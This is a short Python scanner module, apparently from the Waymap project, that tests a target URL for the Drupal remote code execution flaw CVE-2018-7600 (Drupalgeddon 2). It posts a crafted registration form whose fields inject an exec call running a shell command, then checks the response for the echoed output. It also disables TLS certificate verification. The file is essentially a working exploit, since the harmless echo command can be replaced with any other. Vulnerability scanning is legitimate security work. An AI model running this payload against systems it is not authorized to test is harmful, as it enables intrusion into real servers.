# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2018-7600

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

G = '\033[92m' 
Y = '\033[93m'  
R = '\033[91m'  
W = '\033[0m'   


def scan_cve_2018_7600(target):
    target_url = f"{target}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
    data = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"}

    print(f"{Y}[*] Testing if: {target} is vulnerable{W}")
    
    try:
        response = requests.post(target_url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and "haha" in response.text:
            print(f"{R}[!] The target {target} is vulnerable to SA-CORE-2018-002 / CVE-2018-7600{W}")
        else:
            print(f"{G}[*] - The target {target} is not vulnerable{W}")
    except Exception as e:
        print(f"{R}[!] - Something went wrong: {str(e)}{W}")

